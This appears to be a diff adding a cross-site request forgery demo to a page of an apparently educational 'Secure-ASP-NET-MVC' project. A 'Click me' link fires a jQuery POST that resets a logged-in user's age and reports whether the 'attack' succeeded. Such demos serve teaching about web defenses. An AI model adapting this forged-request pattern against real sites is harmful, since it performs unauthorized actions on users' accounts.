@@ -105,8 +105,22 @@
 <BR>
 <BR>
 <BR>
+ <font face ="Times New Roman">Secure-ASP-NET-MVC</font>
 <BR>
 <BR>
+<font face ="Times New Roman"><a id="CSFR">Click me to reset your age!!!!</a>
+
+<script type="text/javascript">
+    $("#CSFR").click(function () {
+        $.ajax({
+            url: "/Registered/MyAge",
+            data: { age: "0" },
+            type: 'POST',
+            success: function () { alert("Attack succeeded");  },
+            error: function () { alert("Attack failed"); }
+        });
+    });
+</script></font>
 <BR>
 <BR>
 </Center>
